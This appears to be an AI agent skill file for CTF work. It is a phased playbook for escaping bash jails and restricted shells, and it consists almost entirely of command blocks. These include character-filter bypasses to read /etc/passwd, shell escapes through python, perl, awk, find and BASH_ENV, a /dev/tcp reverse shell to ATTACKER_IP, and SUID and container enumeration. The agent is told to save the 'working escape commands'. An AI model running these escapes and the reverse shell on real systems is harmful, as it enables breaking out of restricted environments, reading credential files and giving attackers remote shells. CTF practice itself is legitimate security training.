---
name: ctf-misc-bashjails
description: "CTF Bash jail escape techniques. Restricted shell bypass, character whitelist bypass, HashCashSlash trick, /proc/cmdline enumeration, /dev/tcp reverse shell, SUID escalation, glob expansion bypass. Triggers: 'bash jail', 'restricted shell', 'rbash', 'shell escape', 'bash bypass', 'character filter bypass', 'bash restricted', 'shell jailbreak'."
---

# CTF — Bash Jails & Restricted Shells

Identify restriction → bypass character filters → escalate from restricted shell.

---

## Phase 1: Identify Restriction Type

```bash
echo $SHELL       # Current shell
echo $PATH        # Available PATH
set              # Shell variables
env              # Environment

echo a           # Basic command
ls -la           # Complex command
cat /etc/passwd  # File read
$(id)            # Command substitution
`id`             # Backtick substitution
id|cat           # Pipe
id;cat           # Semicolon
id&&cat          # AND
echo *           # Glob expansion
echo {a..z}      # Brace expansion
echo $((1+1))    # Arithmetic
printf '%s' id   # printf
```

---

## Phase 2: Character Whitelist Bypass

```bash
# \$$ = literal "$" (backslash-escaped $)
# $# = 0 (number of arguments)

\$$#

$((0))  # = 0

cat$IFS/etc/passwd
cat${IFS}/etc/passwd

cat /???/passwd   # /etc/passwd
cat /??p/*.???    # /tmp/flag.txt
ls /*             # list all top-level dirs
ls ??             # list 2-char files
```

---

## Phase 3: Common Escapes

```bash
# 1. Set PATH and run binary:
BASH_CMDS[a]=/bin/sh; a
export PATH=/bin:/usr/bin

# 2. SSH with command override:
ssh user@localhost bash --norc

# 3. Less/man/vim escape:

# 4. Python/perl inside shell:
python3 -c "import os; os.execl('/bin/bash', 'bash')"
perl -e 'exec "/bin/bash"'

# 5. Via LD_PRELOAD (if writable):

# 6. AWK escape:
awk 'BEGIN {system("/bin/bash")}'

# 7. Find -exec:
find / -name nothing -exec /bin/bash \;

# 8. Environment variable injection:
BASH_ENV=/tmp/evil_script bash -p

# 9. Glob + env:
/bin/sh  (if glob expansion shows full paths)
```

---

## Phase 4: /dev/tcp for Network Connectivity

```bash
exec 3<>/dev/tcp/HOST/PORT
cat <&3     # read from socket
echo "cmd" >&3  # write to socket

cat /proc/*/cmdline 2>/dev/null | tr '\0' ' ' | grep -iE "flag|serve|listen"
ls /proc/*/exe 2>/dev/null

exec 3<>/dev/tcp/127.0.0.1/1337
cat <&3 &
cat >&3

bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

## Phase 5: Post-Escape Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null

getcap -r / 2>/dev/null

ps aux
cat /proc/*/cmdline 2>/dev/null | xargs -0 | tr '\0\n' ' \n'

find / -writable -type d 2>/dev/null

cat /.dockerenv 2>/dev/null && echo "Docker!"
cat /proc/1/cgroup | grep docker
```

---

## Phase 6: Specific Whitelist Scenarios

```bash
a=$(echo "cm9vdA==" | base64 -d)  # if base64 allowed

cat${IFS}/etc/passwd
cat</etc/passwd     # redirect as workaround
{cat,/etc/passwd}   # brace grouping

$'\157\163' = os  (octal)

echo $'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'  # /etc/passwd

cat /etc/passwd | head
```

---

## Output

Save to `.omop/engagement/ctf/misc/`:
- `escape-payload.sh` — working escape commands
- `shell-access.txt` — evidence of shell access

## Next Phase

→ `ctf-misc-pyjails` for Python jails
→ `pentest-exploit` for privilege escalation
